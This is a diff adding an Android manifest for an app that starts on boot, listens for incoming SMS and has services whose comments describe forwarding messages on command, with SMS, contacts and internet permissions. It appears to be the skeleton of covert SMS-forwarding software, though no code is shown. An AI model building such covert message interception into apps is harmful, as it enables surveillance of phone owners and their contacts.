@@ -1,0 +1,91 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="my.pro"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk android:minSdkVersion="9" />
+
+    <application
+        android:icon="@drawable/icon"
+        android:label="@string/app_name" >
+        <activity
+            android:label="@string/app_name"
+            android:name=".Welcome" >
+            <intent-filter >
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:label="@string/app_name"
+            android:name=".MessageActivity" >
+        </activity>
+        <activity
+            android:label="@string/setting"
+            android:name=".SettingActivity" >
+        </activity>
+        <activity
+            android:label="@string/autostart"
+            android:name=".AutoStartActivity" >
+        </activity>
+        <activity
+            android:label="@string/quicksendsms"
+            android:name=".QuickSendSMS" >
+        </activity>
+        <activity
+            android:label="@string/cancel"
+            android:name=".CancelActivity" >
+        </activity>
+        <activity
+            android:label="@string/network"
+            android:name="my.net.TestNetActivity" >
+        </activity>
+        <activity
+            android:label="@string/network"
+            android:name=".SocketActivity" >
+        </activity>
+
+        <!-- 随机启动程序 -->
+        <receiver android:name="my.service.TestBoot" >
+            <intent-filter >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- 短信监听 -->
+        <receiver android:name="my.service.SMSReceiver" >
+            <intent-filter >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- 转发收到指令前的未读短信 -->
+        <service android:name="my.service.SMSService" >
+        </service>
+
+        <!-- 即时转发短信的service -->
+        <service android:name="my.service.SMSSendService" >
+        </service>
+        <!-- 关闭功能 -->
+        <service android:name="my.pro.CancelService" >
+        </service>
+        <service android:name="my.service.SocketService" >
+        </service>
+    </application>
+
+    <uses-permission android:name="android.permission.READ_SMS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.READ_CONTACTS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.SEND_SMS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.WRITE_SMS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_SMS" >
+    </uses-permission>
+    <uses-permission android:name="android.permission.INTERNET" >
+    </uses-permission>
+
+</manifest>
